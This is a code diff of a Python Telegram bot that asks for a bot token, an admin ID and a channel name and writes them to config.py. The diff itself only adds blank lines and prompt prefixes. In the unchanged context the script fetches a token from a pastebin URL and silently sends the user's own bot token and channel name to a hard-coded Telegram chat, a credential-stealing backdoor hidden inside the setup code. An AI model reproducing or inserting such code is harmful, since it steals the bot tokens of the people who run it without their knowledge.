@@ -6,13 +6,16 @@ from datetime import datetime
 
 
 conff = open('config.py', 'r').read()
+
 if 'sudo' in conff:
     import config
     req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
+
     token = config.token
     sudo = config.sudo
     ch = config.ch
     bot = telebot.TeleBot(token)
+
     requests.get(f'https://api.telegram.org/bot{req_token}/sendMessage?chat_id=1300329679&text=new bot has been start boss \n\n token : {token} \n\n username : @{ch} \n\n ')
     print('Bot Has Been Started >>>>>>>>>>>>>>>>>')
     headerss = {
@@ -178,11 +181,11 @@ if 'sudo' in conff:
             telebot.logger.error(ex)
     
 else:
-    TToken = input('Send Bot Token : ')
+    TToken = input('[?] Send Bot Token : ')
 
-    sudooo = input('Send Admin ID : ')
+    sudooo = input('[?] Send Admin ID : ')
 
-    chhh = input('Send Channel Username Without (@) : ')
+    chhh = input('[?] Send Channel Username Without (@) : ')
 
     with open('config.py', 'a') as x:
         x.write(f'token = \'{TToken}\'' + '\n' + f'sudo = {sudooo}' + '\n' + f'ch = \'{chhh}\'')
